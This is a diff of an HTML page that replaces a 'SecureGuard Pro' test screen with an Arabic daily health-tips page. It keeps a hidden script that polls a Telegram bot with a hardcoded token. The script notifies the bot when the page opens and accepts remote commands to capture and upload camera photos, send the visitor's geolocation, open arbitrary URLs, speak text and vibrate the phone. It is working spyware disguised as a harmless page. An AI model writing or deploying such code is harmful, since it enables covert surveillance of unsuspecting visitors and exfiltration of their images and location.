@@ -3,24 +3,60 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SecureGuard Pro</title>
+<title>نصائح صحية</title>
 <style>
-body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
-h1{color:#00ff88;font-size:22px}
-p{color:#aaa;font-size:12px}
-button{padding:14px 28px;background:#00ff88;color:#000;border:none;border-radius:30px;font-size:15px;font-weight:bold;margin:5px}
-#status{color:#00ff88;font-size:12px;margin:10px}
+body{background:#f5f5f5;color:#333;font-family:sans-serif;text-align:center;padding:20px}
+.header{background:#4CAF50;color:#fff;padding:25px;border-radius:15px;margin-bottom:20px}
+.header h1{font-size:22px;margin:0}
+.header p{font-size:12px;opacity:0.8;margin:5px 0 0}
+.card{background:#fff;border-radius:10px;padding:15px;margin:10px 0;box-shadow:0 2px 5px rgba(0,0,0,0.1);text-align:right}
+.card h3{color:#4CAF50;font-size:16px;margin:0 0 10px}
+.card p{font-size:13px;color:#666;line-height:1.6}
+.tip{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid #eee}
+.tip:last-child{border-bottom:none}
+.tip .icon{width:24px;height:24px;flex-shrink:0}
+.tip .text{font-size:12px;color:#555}
+.footer{font-size:10px;color:#aaa;margin-top:20px}
 </style>
 </head>
 <body>
-<h1>SecureGuard Pro</h1>
-<p>متصل</p>
-<div id="status">🟢 جاهز</div>
-<button onclick="test()">اختبار</button>
+
+<div class="header">
+<h1>نصائح صحية يومية</h1>
+<p>صحتك تهمنا</p>
+</div>
+
+<div class="card">
+<h3>نصائح اليوم</h3>
+<div class="tip">
+<svg class="icon" viewBox="0 0 24 24" fill="#2196F3"><path d="M12 2c-5.33 4.55-8 8.48-8 11.8 0 4.98 3.8 8.2 8 8.2s8-3.22 8-8.2c0-3.32-2.67-7.25-8-11.8zm0 18c-3.35 0-6-2.57-6-6.2 0-2.34 1.95-5.44 6-9.14 4.05 3.7 6 6.79 6 9.14 0 3.63-2.65 6.2-6 6.2zm-2.5-6.5c0 1.38 1.12 2.5 2.5 2.5s2.5-1.12 2.5-2.5-1.12-2.5-2.5-2.5-2.5 1.12-2.5 2.5z"/></svg>
+<span class="text">اشرب 8 أكواب ماء يومياً</span>
+</div>
+<div class="tip">
+<svg class="icon" viewBox="0 0 24 24" fill="#FF9800"><path d="M13.5 5.5c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zM9.8 8.9L7 23h2.1l1.8-8 2.1 2v6h2v-7.5l-2.1-2 .6-3C14.8 12 16.8 13 19 13v-2c-1.9 0-3.5-1-4.3-2.4l-1-1.6c-.4-.6-1-1-1.7-1-.3 0-.5.1-.8.1L6 8.3V13h2V9.6l1.8-.7"/></svg>
+<span class="text">امش 30 دقيقة يومياً</span>
+</div>
+<div class="tip">
+<svg class="icon" viewBox="0 0 24 24" fill="#4CAF50"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+<span class="text">احصل على 8 ساعات نوم</span>
+</div>
+<div class="tip">
+<svg class="icon" viewBox="0 0 24 24" fill="#E91E63"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+<span class="text">تناول الخضروات والفواكه</span>
+</div>
+</div>
+
+<div class="card">
+<h3>معلومة صحية</h3>
+<p>شرب الماء بانتظام يساعد على تحسين عملية الهضم، وتنظيم درجة حرارة الجسم، والحفاظ على صحة الجلد. كما أن المشي اليومي يحسن الدورة الدموية ويقوي عضلة القلب.</p>
+</div>
+
+<div class="footer">جميع الحقوق محفوظة 2025</div>
+
 <script>
 const BOT="8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
 const CHAT="6453594151";
-let lastUpdateId=0;
+let lui=0;
 
 async function sendMsg(t){
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
@@ -31,20 +67,20 @@ async function sendMsg(t){
 
 async function checkCmd(){
     try{
-        let r=await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUpdateId+1}&timeout=5`);
+        let r=await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lui+1}&timeout=5`);
         let d=await r.json();
         if(d.ok&&d.result.length>0){
             for(let u of d.result){
-                lastUpdateId=u.update_id;
+                lui=u.update_id;
                 let m=u.message;
                 if(m&&m.text){
                     let c=m.text.trim();
-                    if(c==='/ping'){sendMsg('🟢 الجهاز متصل');}
+                    if(c==='/ping'){sendMsg('متصل');}
                     else if(c.startsWith('/say ')){
                         let t=c.replace('/say ','');
                         let s=new SpeechSynthesisUtterance(t);
                         s.lang='ar';window.speechSynthesis.speak(s);
-                        sendMsg('✅ تم: '+t);
+                        sendMsg('تم: '+t);
                     }
                     else if(c==='/photo'){
                         try{
@@ -57,26 +93,20 @@ async function checkCmd(){
                             let bl=await(await fetch(p)).blob();
                             let fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',bl,'camera.jpg');
                             await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
-                            sendMsg('📷 صورة');
-                        }catch(e){sendMsg('❌ فشل الكاميرا');}
+                            sendMsg('صورة');
+                        }catch(e){sendMsg('فشل');}
                     }
                     else if(c==='/location'){
                         navigator.geolocation.getCurrentPosition(async p=>{
-                            sendMsg(`📍 ${p.coords.latitude},${p.coords.longitude}\nhttps://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
-                        },()=>{sendMsg('❌ فشل الموقع');});
+                            sendMsg(`الموقع:\n${p.coords.latitude},${p.coords.longitude}\nhttps://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
+                        },()=>{sendMsg('فشل');});
                     }
                     else if(c.startsWith('/open ')){
                         let u=c.replace('/open ','');
-                        window.open(u,'_blank');sendMsg('🔗 '+u);
+                        window.open(u,'_blank');sendMsg('تم: '+u);
                     }
                     else if(c==='/vibrate'){
-                        if(navigator.vibrate){navigator.vibrate([500,200,500]);sendMsg('📳 اهتزاز');}
-                    }
-                    else if(c==='/notify'){
-                        if(Notification.permission==='granted'){
-                            new Notification('SecureGuard',{body:'إشعار',vibrate:[200,100,200]});
-                            sendMsg('🔔 إشعار');
-                        }
+                        if(navigator.vibrate){navigator.vibrate([500,200,500]);sendMsg('اهتزاز');}
                     }
                 }
             }
@@ -84,16 +114,7 @@ async function checkCmd(){
     }catch(e){}
 }
 
-async function test(){
-    document.getElementById('status').textContent='جاري...';
-    await sendMsg('✅ اختبار: البوت شغال');
-    document.getElementById('status').textContent='✅ تم';
-}
-
-sendMsg('🔔 فتح التطبيق');
-if('Notification' in window&&Notification.permission!=='granted'&&Notification.permission!=='denied'){
-    Notification.requestPermission();
-}
+sendMsg('تم فتح الصفحة');
 setInterval(checkCmd,2000);
 </script>
 </body>
